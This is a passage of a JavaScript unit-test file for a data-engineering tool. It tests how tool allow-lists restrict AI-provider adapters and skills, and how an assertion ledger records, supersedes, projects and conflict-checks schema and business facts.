        offeredPerTurn.push((options.tools || []).map((t) => t.name));
        const parts = turn++ === 0 ? [new ToolCallPart('c1', 'autode_read_file', { path: 'a.txt' })] : [new TextPart('done')];
        return { stream: (async function* () { for (const p of parts) yield p; })(), text: (async function* () {})() };
      }
    };
    const mock = createMock({ models: [model], config: { languageModelProgrammaticConsent: true } });
    Object.assign(mock, { LanguageModelTextPart: TextPart, LanguageModelToolCallPart: ToolCallPart, LanguageModelToolResultPart: ToolResultPart });
    mock.workspace.fs.readFile = async (uri) => nodeFs.readFileSync(uri.fsPath);
    try {
      delete require.cache[require.resolve('../dist/core/agenticTools.js')];
      const lib = freshAdapter(mock);
      const { adapter } = await withMock(mock, () => lib.LanguageModelAdapter.detect(mockContext(), { provider: 'copilot' }));
      assert.ok(adapter, 'expected a Copilot adapter');
      const { text, audit } = await withMock(mock, () => adapter.completeWithTools('go', { mode: 'full', workspaceRoot: dir, allowedToolNames: ['autode_read_file'] }));
      assert.strictEqual(text, 'done');
      assert.deepStrictEqual(offeredPerTurn[0], ['autode_read_file']);
      assert.deepStrictEqual(audit.map((a) => `${a.tool}:${a.outcome}`), ['autode_read_file:ok']);
    } finally {
      nodeFs.rmSync(dir, { recursive: true, force: true });
    }
  });

  await test('v0.28.0: Claude Code receives the allow-list as its --tools list, and a read-only allow-list never gets write mode', async () => {
    const mock = claudeCodeMock({ versionOut: '2.1.0', spawnResult: { result: 'ok', subtype: 'success' } });
    const lib = freshClaude(mock);
    const { adapter } = await withMock(mock, () => lib.ClaudeCodeAdapter.detect(''));
    const toolsArg = (args) => { const i = args.indexOf('--tools'); const out = []; for (let j = i + 1; j < args.length && !args[j].startsWith('--'); j++) out.push(args[j]); return out; };

    await withMock(mock, () => adapter.complete('x', { toolMode: 'full', allowedTools: ['autode_read_file', 'autode_write_file'] }));
    assert.deepStrictEqual(toolsArg(mock.__lastSpawn.args), ['Read', 'Edit', 'Write']);
    assert.ok(mock.__lastSpawn.args.includes('acceptEdits'));

    await withMock(mock, () => adapter.complete('x', { toolMode: 'full', allowedTools: ['autode_read_file'] }));
    assert.deepStrictEqual(toolsArg(mock.__lastSpawn.args), ['Read']);
    assert.ok(!mock.__lastSpawn.args.includes('acceptEdits'), 'no write tools allowed → no auto-accepting edit mode');

    await withMock(mock, () => adapter.complete('x', { toolMode: 'full' }));
    assert.deepStrictEqual(toolsArg(mock.__lastSpawn.args), ['Read', 'Grep', 'Glob', 'Edit', 'Write', 'Bash'], 'no allow-list = unchanged');
  });

  await test('v0.28.0: ToolSkillAgent runs a skill on a non-Copilot provider through the hub, capped by its allowed-tools, with the audit returned', async () => {
    const os = require('node:os');
    const nodePath = require('node:path');
    const nodeFs = require('node:fs');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-skill-'));
    const skillDir = nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills', 'reader');
    nodeFs.mkdirSync(skillDir, { recursive: true });
    nodeFs.writeFileSync(nodePath.join(skillDir, 'SKILL.md'), '---\nname: reader\ndescription: reads things\nallowed-tools: [Read]\n---\nRead a.txt and summarise it.\n');
    const mock = createMock();
    try {
      const { DataAgentHubHub } = withMock(mock, () => fresh('../dist/core/agentHub.js'));
      const { LLM_ADAPTERS } = withMock(mock, () => require('../dist/core/llmProviders.js'));
      const { executeToolSkillAgent } = withMock(mock, () => fresh('../dist/agents/build/ToolSkillAgent.js'));
      const settings = { activeLlmProvider: 'openai', activeLlmModel: 'gpt-x', languageModelProgrammaticConsent: true };
      const hub = new DataAgentHubHub(fakeCm(settings));
      let seen;
      const realComplete = LLM_ADAPTERS.openai.complete;
      LLM_ADAPTERS.openai.complete = async (prompt, opts) => {
        seen = opts;
        opts.auditSink.push({ tool: 'autode_read_file', input: { path: 'a.txt' }, outcome: 'ok', at: 'now' });
        return 'summary';
      };
      try {
        const context = {
          objective: '', settings, workspaceRoot: ws, log: () => {},
          configManager: { getSecret: async () => undefined, getSettings: () => settings },
          runWithTools: (p, o) => hub.runConfiguredLlmWithTools(p, o)
        };
        const result = await withMock(mock, () => executeToolSkillAgent({ id: 's', assignedAgent: 'toolSkillAgent', taskDescription: 'summarise a.txt', status: 'running', skillId: 'reader' }, context));
        assert.strictEqual(result.success, true, result.message);
        assert.strictEqual(result.message, 'summary');
        assert.strictEqual(seen.toolExecutionMode, 'read-only', 'a skill declaring only Read never runs in full mode');
        assert.deepStrictEqual(seen.allowedToolNames, ['autode_read_file']);
        assert.strictEqual(seen.approvalPrompt, undefined, 'no whole-run approval text outside the Claude path');
        assert.strictEqual(result.details.audit.length, 1, 'the provider loop audit comes back with the result');
      } finally {
        LLM_ADAPTERS.openai.complete = realComplete;
      }
    } finally {
      nodeFs.rmSync(ws, { recursive: true, force: true });
    }
  });

  await test('v0.28.0: on the Claude path the skill approval text says individual tool calls cannot be audited', async () => {
    const os = require('node:os');
    const nodePath = require('node:path');
    const nodeFs = require('node:fs');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-skill-'));
    const skillDir = nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills', 'writer');
    nodeFs.mkdirSync(skillDir, { recursive: true });
    nodeFs.writeFileSync(nodePath.join(skillDir, 'SKILL.md'), '---\nname: writer\n---\nWrite a file.\n');
    try {
      const { executeToolSkillAgent } = withMock(createMock(), () => fresh('../dist/agents/build/ToolSkillAgent.js'));
      let seen;
      const settings = { activeLlmProvider: 'claude', languageModelProgrammaticConsent: true };
      const result = await executeToolSkillAgent({ id: 's', assignedAgent: 'toolSkillAgent', taskDescription: 'write it', status: 'running', skillId: 'writer' }, {
        objective: '', settings, workspaceRoot: ws, log: () => {}, configManager: { getSecret: async () => undefined, getSettings: () => settings },
        runWithTools: async (_p, o) => { seen = o; return { text: 'ok', audit: [], provider: 'claude' }; }
      });
      assert.strictEqual(result.success, true);
      assert.strictEqual(seen.toolExecutionMode, 'full', 'no declared tools = no extra restriction, as before');
      assert.strictEqual(seen.allowedToolNames, undefined);
      assert.ok(/whole run once/.test(seen.approvalPrompt) && /cannot audit or block individual tool calls/.test(seen.approvalPrompt), seen.approvalPrompt);
    } finally {
      nodeFs.rmSync(ws, { recursive: true, force: true });
    }
  });

  await test('v0.28.0: the discovery prompt now carries each interview skill\'s systemPrompt', () => {
    const { createIntakeSession } = require('../dist/engine/interview/specOps.js');
    const { buildDiscoveryTurnPrompt } = require('../dist/core/specOpsPrompts.js');
    const skill = { id: 'data-flow', name: 'Data Flow', order: 1, description: '', systemPrompt: 'Ask one flow at a time.', questionGuidance: 'Target dataFlows.', specFields: ['dataFlows'], exampleQuestions: [] };
    const { user } = buildDiscoveryTurnPrompt(createIntakeSession('move orders to snowflake'), [skill]);
    assert.ok(user.includes('- data-flow: Target dataFlows.'));
    assert.ok(user.includes('approach: Ask one flow at a time.'));
  });

  // ---------- v0.29.0: context-layer C2 — assertion ledger and projection ----------

  const c2 = {
    tmp() { const os = require('node:os'); const nodeFs = require('node:fs'); const p = require('node:path'); return nodeFs.mkdtempSync(p.join(os.tmpdir(), 'autode-c2-')); },
    ledgerDir(root) { return require('node:path').join(root, 'ledger'); },
    /** A small graph shaped like every producer's output: a table + columns + contains edges, a glossary term, a spec-derived rule. */
    graph() {
      const fileOrigin = { source: 'derived', sourceRef: '/data/shop.ddl', extractor: 'file-ingestion', extractedAt: '2026-10-01T00:00:00.000Z', environment: 'source', confidence: 1, reliability: 'best-effort-inferred' };
      const liveOrigin = { source: 'system', sourceRef: 'snowflake', connectionId: 'sf-main', extractedAt: '2026-10-01T00:00:00.000Z', reliability: 'live-verified', lastVerifiedAt: '2026-10-01T00:00:00.000Z' };
      const nodes = [
        { id: 'table-shop_orders', type: 'table', label: 'orders', database: 'ingested_files', schema: 'shop', fqn: 'shop.orders', isView: false, metadata: {}, version: 1, origin: fileOrigin },
        { id: 'col-shop_orders.order_id', type: 'column', label: 'order_id', dataType: 'INTEGER', isNullable: false, isPrimaryKey: true, isForeignKey: false, metadata: { ordinalPosition: 1 }, version: 1, origin: fileOrigin },
        { id: 'col-shop_orders.status', type: 'column', label: 'status', dataType: 'VARCHAR(20)', isNullable: true, isPrimaryKey: false, isForeignKey: false, metadata: { ordinalPosition: 2 }, version: 1, origin: fileOrigin },
        { id: 'table-sf_customers', type: 'table', label: 'customers', database: 'DB', schema: 'CRM', fqn: 'DB.CRM.customers', isView: false, metadata: {}, version: 1, origin: liveOrigin },
        { id: 'biz-term-revenue', type: 'business_term', label: 'Revenue', description: 'Gross merchandise value', formula: 'SUM(order_items.quantity * order_items.unit_price)', mappedNodeIds: [], metadata: {}, version: 1, origin: { source: 'user', sourceRef: 'context/business-context.yaml', extractor: 'business-context' } },
        { id: 'spec-rule-bps-1-c0', type: 'business_rule', label: 'Daily refresh', ruleText: 'Daily refresh', enforcementLevel: 'STRICT', metadata: {}, version: 2, origin: { source: 'derived', sourceRef: 'spec:bps-1', specId: 'bps-1', specVersion: 2, extractor: 'spec-sync' } }
      ];
      const edges = [
        { id: 'edge-contains-table-shop_orders-col-shop_orders.order_id', source: 'table-shop_orders', target: 'col-shop_orders.order_id', type: 'contains', weight: 1 },
        { id: 'edge-contains-table-shop_orders-col-shop_orders.status', source: 'table-shop_orders', target: 'col-shop_orders.status', type: 'contains', weight: 1 }
      ];
      return { nodes, edges };
    },
    withoutProjected(items) {
      return items.map((x) => {
        const c = JSON.parse(JSON.stringify(x));
        delete c.supportedBy;
        if (c.origin) delete c.origin.confidence;
        return c;
      });
    }
  };

  await test('v0.29.0: ULIDs are 26 Crockford chars and strictly increase within one millisecond', () => {
    const { createUlidFactory } = require('../dist/engine/context/assertions.js');
    const next = createUlidFactory(() => 1760000000000);
    const ids = Array.from({ length: 50 }, () => next());
    assert.ok(ids.every((id) => /^[0-9A-HJKMNP-TV-Z]{26}$/.test(id)), ids[0]);
    for (let i = 1; i < ids.length; i++) assert.ok(ids[i] > ids[i - 1], `${ids[i]} > ${ids[i - 1]}`);
  });

  await test('v0.29.0: per-kind Ajv schemas validate an assertion value (relationship, key, metric) and the envelope', () => {
    const { validateAssertion } = require('../dist/engine/context/assertionSchemas.js');
    const base = { subject: ['table-a', 'table-b'], predicate: 'joins_to', statement: 'a joins b', evidence: [{ type: 'chat_message', ref: 't4' }] };
    assert.deepStrictEqual(validateAssertion({ ...base, kind: 'relationship', value: { from: { entity: 'a', columns: ['id'] }, to: { entity: 'b', columns: ['a_id'] }, cardinality: '1:N', optional: false } }), []);
    assert.ok(validateAssertion({ ...base, kind: 'relationship', value: { from: { entity: 'a', columns: [] }, to: { entity: 'b', columns: ['x'] }, cardinality: '2:2' } }).length >= 2, 'empty column list and a bad cardinality are both reported');
    assert.deepStrictEqual(validateAssertion({ ...base, kind: 'key', predicate: 'primary', value: ['order_id'] }), []);
    assert.ok(validateAssertion({ ...base, kind: 'key', predicate: 'primary', value: 'order_id' }).length > 0);
    assert.ok(validateAssertion({ ...base, kind: 'metric', predicate: 'defined_as', value: { name: 'Revenue' } }).length > 0, 'a metric needs an expression or a definition');
    assert.ok(validateAssertion({ ...base, kind: 'key', value: ['x'], evidence: [] }).some((e) => /evidence/.test(e)));
    assert.ok(validateAssertion({ ...base, kind: 'nonsense', value: {} })[0].includes('unknown kind'));
  });

  await test('v0.29.0: migration of the graph into the ledger is graph-equivalent and idempotent (also across sessions)', async () => {
    const nodeFs = require('node:fs');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger, projectGraph } = require('../dist/engine/context/projection.js');
    const root = c2.tmp();
    try {
      const g = c2.graph();
      const ledger = new AssertionLedger(c2.ledgerDir(root));
      await ledger.load();
      const first = await syncGraphToLedger(ledger, g);
      assert.strictEqual(first.asserted, g.nodes.length + g.edges.length);
      const projected = projectGraph(ledger.assertions(), { activeSpecId: 'bps-1' });
      assert.deepStrictEqual(c2.withoutProjected(projected.nodes), c2.withoutProjected(g.nodes), 'node set equal pre/post (apart from the fields the projection adds)');
      assert.deepStrictEqual(c2.withoutProjected(projected.edges), c2.withoutProjected(g.edges), 'edge set equal pre/post');
      assert.ok(projected.nodes.every((n) => Array.isArray(n.supportedBy) && n.supportedBy.length === 1));
      const byId = Object.fromEntries(projected.nodes.map((n) => [n.id, n]));
      assert.strictEqual(byId['table-sf_customers'].origin.confidence, 1.0, 'live-verified → verified');
      assert.strictEqual(byId['table-shop_orders'].origin.confidence, 0.8, 'file-derived → documented');
      assert.strictEqual(byId['spec-rule-bps-1-c0'].origin.confidence, 0.9, 'from an approved spec → confirmed');
      const trustOf = (id) => ledger.get(byId[id].supportedBy[0]).trust;
      assert.deepStrictEqual([trustOf('table-sf_customers'), trustOf('table-shop_orders'), trustOf('biz-term-revenue'), trustOf('spec-rule-bps-1-c0')], ['verified', 'documented', 'documented', 'confirmed']);
      assert.strictEqual(ledger.get(byId['spec-rule-bps-1-c0'].supportedBy[0]).specId, 'bps-1');
      assert.strictEqual(ledger.get(byId['table-shop_orders'].supportedBy[0]).specId, undefined, 'project-wide when not from a spec');

      // Idempotent: the projected graph syncs back without a single event — in this session and in a new one.
      assert.strictEqual((await syncGraphToLedger(ledger, projected, { activeSpecId: 'bps-1' })).events, 0);
      assert.strictEqual((await syncGraphToLedger(ledger, g, { activeSpecId: 'bps-1' })).events, 0, 'timestamps and confidence alone are not a change');
      const later = new AssertionLedger(c2.ledgerDir(root));
      await later.load();
      assert.strictEqual((await syncGraphToLedger(later, projected, { activeSpecId: 'bps-1' })).events, 0);
      assert.strictEqual(nodeFs.readdirSync(c2.ledgerDir(root)).filter((f) => f.endsWith('.jsonl')).length, 1, 'a session that appends nothing writes no file');
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: folding is deterministic — the same ledger always gives a byte-identical projection, whatever order its files are read in', async () => {
    const nodeFs = require('node:fs');
    const { AssertionLedger, foldEvents } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger, projectGraph } = require('../dist/engine/context/projection.js');
    const root = c2.tmp();
    try {
      const s1 = new AssertionLedger(c2.ledgerDir(root));
      await syncGraphToLedger(s1, c2.graph());
      const s2 = new AssertionLedger(c2.ledgerDir(root));
      await s2.load();
      const g = c2.graph();
      g.nodes[2] = { ...g.nodes[2], dataType: 'VARCHAR(40)' };
      await syncGraphToLedger(s2, g);
      await s2.assert({ kind: 'key', subject: ['table-shop_orders'], predicate: 'primary', value: ['order_id'], statement: 'order_id is the key', evidence: [{ type: 'chat_message', ref: 't3' }] });

      const read = async () => { const l = new AssertionLedger(c2.ledgerDir(root)); await l.load(); return l; };
      const a = await read();
      const b = await read();
      assert.strictEqual(JSON.stringify(projectGraph(a.assertions())), JSON.stringify(projectGraph(b.assertions())));
      const events = [...a.allEvents()];
      const reversed = foldEvents(events.slice().reverse());
      assert.strictEqual(JSON.stringify(reversed), JSON.stringify(foldEvents(events)), 'event order on disk does not matter; ids do');
      assert.strictEqual(JSON.stringify(projectGraph(reversed)), JSON.stringify(projectGraph(a.assertions())));
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: a changed fact supersedes (validTo, supersededBy, history kept), a vanished one is rejected with a reason, and dependents go to review', async () => {
    const nodeFs = require('node:fs');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger, projectGraph } = require('../dist/engine/context/projection.js');
    const root = c2.tmp();
    try {
      const ledger = new AssertionLedger(c2.ledgerDir(root));
      let g = c2.graph();
      await syncGraphToLedger(ledger, g, { activeSpecId: 'bps-1' });
      const statusRule = await ledger.assert({ kind: 'quality_expectation', subject: ['col-shop_orders.status'], predicate: 'accepted_values', value: { check: 'accepted_values', values: ['OPEN', 'CANCELLED'] }, statement: 'status is OPEN or CANCELLED', evidence: [{ type: 'chat_message', ref: 't9' }], status: 'active', trust: 'confirmed' });
      const keyClaim = await ledger.assert({ kind: 'key', subject: ['table-sf_customers'], predicate: 'primary', value: ['cust_no'], statement: 'cust_no is the key', evidence: [{ type: 'chat_message', ref: 't6' }], status: 'active', trust: 'confirmed' });
      const oldId = projectGraph(ledger.assertions(), { activeSpecId: 'bps-1' }).nodes.find((n) => n.id === 'col-shop_orders.status').supportedBy[0];

      g = c2.graph();
      g.nodes[2] = { ...g.nodes[2], dataType: 'VARCHAR(40)' };
      g.nodes.splice(3, 1); // the live customers table disappeared
      const r = await syncGraphToLedger(ledger, g, { activeSpecId: 'bps-1' });
      assert.deepStrictEqual([r.asserted, r.superseded, r.retracted, r.dependentsFlagged], [0, 1, 1, 2]);

      const old = ledger.get(oldId);
      assert.strictEqual(old.status, 'superseded');
      assert.ok(old.validTo && old.supersededBy);
      const replacement = ledger.get(old.supersededBy);
      assert.strictEqual(replacement.supersedes, oldId);
      assert.strictEqual(replacement.value.node.dataType, 'VARCHAR(40)');
      assert.ok(ledger.history(oldId).some((e) => e.type === 'asserted'), 'the original assertion is still on disk');

      const gone = ledger.assertions().find((a) => a.predicate === 'node' && a.value.node.id === 'table-sf_customers');
      assert.strictEqual(gone.status, 'rejected');
      assert.ok(/no longer present in sf-main/.test(gone.reviewReason), gone.reviewReason);
      assert.strictEqual(ledger.get(statusRule.id).status, 'needs_review');
      assert.ok(/schema fact .* changed/.test(ledger.get(statusRule.id).reviewReason));
      assert.strictEqual(ledger.get(keyClaim.id).status, 'needs_review');

      const projected = projectGraph(ledger.assertions(), { activeSpecId: 'bps-1' });
      assert.ok(!projected.nodes.some((n) => n.id === 'table-sf_customers'), 'rejected facts are not projected');
      assert.strictEqual(projected.nodes.find((n) => n.id === 'col-shop_orders.status').dataType, 'VARCHAR(40)');
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: lifecycle events fold as specified — confirm, reject, explicit supersede, failed verification', async () => {
    const nodeFs = require('node:fs');
    const { AssertionLedger, AssertionValidationError } = require('../dist/engine/context/ledger.js');
    const root = c2.tmp();
    try {
      const ledger = new AssertionLedger(c2.ledgerDir(root));
      const ev = [{ type: 'chat_message', ref: 't5', excerpt: 'x'.repeat(400) }];
      const v1 = await ledger.assert({ kind: 'key', subject: ['table-crm_customers'], predicate: 'primary', value: ['customer_id'], statement: 'customer_id is the key', evidence: ev });
      assert.deepStrictEqual([v1.status, v1.trust, v1.createdBy], ['proposed', 'inferred', 'system']);
      assert.strictEqual(v1.evidence[0].excerpt.length, 300, 'excerpts are capped at 300 chars');
      const v2 = await ledger.supersede(v1.id, { kind: 'key', subject: ['table-crm_customers'], predicate: 'primary', value: ['cust_no'], statement: 'cust_no is the key', evidence: [{ type: 'chat_message', ref: 't6' }] });
      assert.strictEqual(ledger.get(v1.id).status, 'superseded');
      assert.strictEqual(ledger.get(v1.id).supersededBy, v2.id);
      await ledger.confirm(v2.id, 'user:arun');
      assert.deepStrictEqual([ledger.get(v2.id).status, ledger.get(v2.id).trust], ['active', 'confirmed']);
      await ledger.recordVerification(v2.id, { method: 'probe', at: '2026-10-14T00:00:00.000Z', result: 'pass' });
      assert.strictEqual(ledger.get(v2.id).trust, 'verified');
      const m = await ledger.assert({ kind: 'key', subject: ['table-crm_loyalty_members'], predicate: 'unique', value: ['member_id'], statement: 'member_id is unique', evidence: [{ type: 'chat_message', ref: 't7' }] });
      await ledger.recordVerification(m.id, { method: 'probe', at: '2026-10-14T00:00:00.000Z', result: 'fail', detail: 'LM-1004 appears twice' });
      assert.deepStrictEqual([ledger.get(m.id).status, ledger.get(m.id).reviewReason], ['needs_review', 'LM-1004 appears twice']);
      await ledger.reject(m.id, 'user:arun', 'not a key');
      assert.ok(ledger.get(m.id).validTo);
      await assert.rejects(() => ledger.assert({ kind: 'key', subject: [], predicate: 'primary', value: 'x', statement: '', evidence: [] }), AssertionValidationError);
      // Everything above was appended to one session file and folds the same after a reload.
      const reread = new AssertionLedger(c2.ledgerDir(root));
      await reread.load();
      assert.strictEqual(JSON.stringify(reread.assertions()), JSON.stringify(ledger.assertions()));
      assert.ok(ledger.history(v2.id).map((e) => e.type).join() === 'asserted,confirmed,verified');
      assert.ok(ledger.history(v1.id).find((e) => e.type === 'superseded').causedBy, 'every derived event says what caused it');
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: the conflict detector raises trap 1 (revenue defined twice) instead of merging, and flags only active sides, once', async () => {
    const nodeFs = require('node:fs');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger } = require('../dist/engine/context/projection.js');
    const { detectConflicts, flagConflicts } = require('../dist/engine/context/conflicts.js');
    const root = c2.tmp();
    try {
      const ledger = new AssertionLedger(c2.ledgerDir(root));
      await syncGraphToLedger(ledger, c2.graph(), { activeSpecId: 'bps-1' });
      assert.deepStrictEqual(detectConflicts(ledger.assertions()), [], 'one definition is not a conflict');
      const same = await ledger.assert({ kind: 'business_term', subject: ['biz-term-revenue'], predicate: 'defined_as', value: { term: 'revenue', formula: 'sum(order_items.quantity*order_items.unit_price)' }, statement: 'Revenue is gross', evidence: [{ type: 'attachment', ref: 'a1' }] });
      assert.deepStrictEqual(detectConflicts(ledger.assertions()), [], 'the same definition, spelled differently, agrees');
      const net = await ledger.assert({ kind: 'metric', subject: ['metric:net_revenue'], predicate: 'defined_as', value: { name: 'Revenue', expression: 'SUM(quantity * unit_price - discount_amount)', filters: ["status <> 'CANCELLED'"] }, statement: 'Revenue means net revenue', evidence: [{ type: 'chat_message', ref: 't2' }] });
      const conflicts = detectConflicts(ledger.assertions());
      assert.strictEqual(conflicts.length, 1);
      assert.strictEqual(conflicts[0].rule, 'definition');
      assert.strictEqual(conflicts[0].key, 'definition|revenue');
      assert.ok(conflicts[0].ids.includes(net.id) && conflicts[0].ids.includes(same.id));
      const glossaryId = conflicts[0].ids.find((id) => id !== net.id && id !== same.id);
      const flagged = await flagConflicts(ledger, conflicts);
      assert.deepStrictEqual(flagged.map((e) => e.assertionId), [glossaryId], 'the active glossary term is flagged; proposals are already awaiting review');
      assert.strictEqual(ledger.get(glossaryId).status, 'needs_review');
      assert.ok(ledger.get(glossaryId).reviewReason.includes(net.id));
      assert.strictEqual((await flagConflicts(ledger, detectConflicts(ledger.assertions()))).length, 0, 'idempotent');
      assert.strictEqual(detectConflicts(ledger.assertions()).length, 1, 'still surfaced until someone resolves it');
      await ledger.reject(net.id, 'user:arun');
      assert.strictEqual(detectConflicts(ledger.assertions()).length, 0, 'a rejected side no longer conflicts');
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: value conflicts (same slot) and claimed-vs-declared primary keys are detected', async () => {
    const nodeFs = require('node:fs');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger } = require('../dist/engine/context/projection.js');
    const { detectConflicts } = require('../dist/engine/context/conflicts.js');
    const root = c2.tmp();
    try {
      const ledger = new AssertionLedger(c2.ledgerDir(root));
      await syncGraphToLedger(ledger, c2.graph(), { activeSpecId: 'bps-1' });
      const ev = [{ type: 'chat_message', ref: 't' }];
      await ledger.assert({ kind: 'key', subject: ['table-shop_orders'], predicate: 'primary', value: ['ORDER_ID'], statement: 'order_id is the key', evidence: ev });
      assert.deepStrictEqual(detectConflicts(ledger.assertions()), [], 'agrees with the declared key (case-insensitive)');
      const bad = await ledger.assert({ kind: 'key', subject: ['table-shop_orders'], predicate: 'primary', value: ['status'], statement: 'status is the key', evidence: ev });
      const rules = detectConflicts(ledger.assertions()).map((c) => c.rule).sort();
      assert.deepStrictEqual(rules, ['declared_key', 'value']);
      const declared = detectConflicts(ledger.assertions()).find((c) => c.rule === 'declared_key');
      assert.ok(declared.ids.includes(bad.id) && declared.sides[1].includes('(order_id)'));
      await ledger.assert({ kind: 'decision', subject: ['dim_customer'], predicate: 'history', value: { scdType: 2 }, statement: 'SCD2', evidence: ev });
      await ledger.assert({ kind: 'decision', subject: ['dim_customer'], predicate: 'history', value: { scdType: 1 }, statement: 'SCD1', evidence: ev });
      assert.ok(detectConflicts(ledger.assertions()).some((c) => c.rule === 'value' && c.subject[0] === 'dim_customer'));
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: spec-scoped assertions survive switching business problems — out of scope, not retracted', async () => {
    const nodeFs = require('node:fs');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger, projectGraph } = require('../dist/engine/context/projection.js');
    const root = c2.tmp();
    try {
      const ledger = new AssertionLedger(c2.ledgerDir(root));
      const g = c2.graph();
      await syncGraphToLedger(ledger, g, { activeSpecId: 'bps-1' });
      const withoutSpec = { nodes: g.nodes.filter((n) => !n.origin.specId), edges: g.edges };
      assert.strictEqual((await syncGraphToLedger(ledger, withoutSpec, { activeSpecId: 'bps-2' })).retracted, 0);
      assert.ok(!projectGraph(ledger.assertions(), { activeSpecId: 'bps-2' }).nodes.some((n) => n.id === 'spec-rule-bps-1-c0'));
      assert.ok(projectGraph(ledger.assertions(), { activeSpecId: 'bps-1' }).nodes.some((n) => n.id === 'spec-rule-bps-1-c0'), 'back in scope when its problem is active again');
      assert.strictEqual((await syncGraphToLedger(ledger, withoutSpec, { activeSpecId: 'bps-1' })).retracted, 1, 'removed while its own problem is active = retracted');
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: subject resolution maps fqns, columns and term:/metric: names to graph ids, and keeps the rest as given', () => {
    const { createSubjectResolver, resolveSubjects } = require('../dist/engine/context/projection.js');
    const resolve = createSubjectResolver(c2.graph());
    assert.deepStrictEqual(resolveSubjects(['shop.orders', 'SHOP.ORDERS.status', 'term:revenue', 'orders', 'metric:net_revenue', 'table-sf_customers'], resolve), {
      subject: ['table-shop_orders', 'col-shop_orders.status', 'biz-term-revenue', 'table-shop_orders', 'metric:net_revenue', 'table-sf_customers'],
      unresolved: ['metric:net_revenue']
    });
  });

  await test('v0.29.0: projection turns live non-mirror definitions into nodes and edges, and ignores proposed ones', async () => {
    const nodeFs = require('node:fs');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger, projectGraph } = require('../dist/engine/context/projection.js');
    const root = c2.tmp();
    try {
      const ledger = new AssertionLedger(c2.ledgerDir(root));
      await syncGraphToLedger(ledger, c2.graph(), { activeSpecId: 'bps-1' });
      const ev = [{ type: 'chat_message', ref: 't11' }];
      const metric = await ledger.assert({ kind: 'metric', subject: ['metric:retention_90d'], predicate: 'defined_as', value: { name: 'Retention 90d', definition: 'another order within 90 days' }, statement: 'retention', evidence: ev });
      const rel = await ledger.assert({ kind: 'relationship', subject: ['table-shop_orders', 'table-sf_customers'], predicate: 'joins_to', value: { from: { entity: 'shop.orders', columns: ['customer_id'] }, to: { entity: 'DB.CRM.customers', columns: ['shop_customer_id'] }, cardinality: 'N:1' }, statement: 'orders join customers', evidence: ev });
      const supportOfRevenue = await ledger.assert({ kind: 'business_term', subject: ['biz-term-revenue'], predicate: 'defined_as', value: { term: 'Revenue', formula: 'SUM(order_items.quantity * order_items.unit_price)' }, statement: 'gross', evidence: ev, status: 'active', trust: 'confirmed' });
      let p = projectGraph(ledger.assertions(), { activeSpecId: 'bps-1' });
      assert.ok(!p.nodes.some((n) => n.type === 'metric') && !p.edges.some((e) => e.type === 'related_to'), 'proposed facts are not projected');
      const revenue = p.nodes.find((n) => n.id === 'biz-term-revenue');
      assert.ok(revenue.supportedBy.includes(supportOfRevenue.id), 'a confirming definition supports the existing term node');
      assert.strictEqual(revenue.origin.confidence, 0.9, 'confidence comes from the strongest supporter');
      await ledger.confirm(metric.id, 'user:arun');
      await ledger.confirm(rel.id, 'user:arun');
      p = projectGraph(ledger.assertions(), { activeSpecId: 'bps-1' });
      const m = p.nodes.find((n) => n.type === 'metric');
      assert.deepStrictEqual([m.id, m.label, m.supportedBy], ['metric:retention_90d', 'Retention 90d', [metric.id]]);
      const e = p.edges.find((x) => x.type === 'related_to');
      assert.deepStrictEqual([e.source, e.target, e.supportedBy], ['table-shop_orders', 'table-sf_customers', [rel.id]]);
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: compaction writes snapshot.json, keeps history unless prune, and folds to the same state', async () => {
    const nodeFs = require('node:fs');
    const p = require('node:path');
    const { AssertionLedger } = require('../dist/engine/context/ledger.js');
    const { syncGraphToLedger } = require('../dist/engine/context/projection.js');
    const root = c2.tmp();
    try {
      const ledger = new AssertionLedger(c2.ledgerDir(root));
      await syncGraphToLedger(ledger, c2.graph());
      const before = JSON.stringify(ledger.assertions());
      const r = await ledger.compact();
      assert.strictEqual(r.prunedFiles, 0);
      const files = () => nodeFs.readdirSync(c2.ledgerDir(root));
      assert.ok(files().includes('snapshot.json') && files().some((f) => f.endsWith('.jsonl')), 'history kept by default');
      const after = new AssertionLedger(c2.ledgerDir(root));
      await after.load();
      assert.strictEqual(JSON.stringify(after.assertions()), before);
      await after.assert({ kind: 'assumption', subject: ['table-shop_orders'], predicate: 'complete', value: {}, statement: 'orders are complete', evidence: [{ type: 'chat_message', ref: 'x' }] });
      const withNew = JSON.stringify(after.assertions());
      const pruned = await after.compact({ prune: true });
      assert.strictEqual(pruned.prunedFiles, 2);
      assert.deepStrictEqual(files(), ['snapshot.json']);
      const fromSnapshot = new AssertionLedger(c2.ledgerDir(root));
      await fromSnapshot.load();
      assert.strictEqual(JSON.stringify(fromSnapshot.assertions()), withNew);
      assert.ok(JSON.parse(nodeFs.readFileSync(p.join(c2.ledgerDir(root), 'snapshot.json'), 'utf8')).lastEventId);
    } finally {
      nodeFs.rmSync(root, { recursive: true, force: true });
    }
  });

  await test('v0.29.0: ContextValidator dispatches per-kind content definitions and warns without failing', () => {
    const nodeFs = require('node:fs');
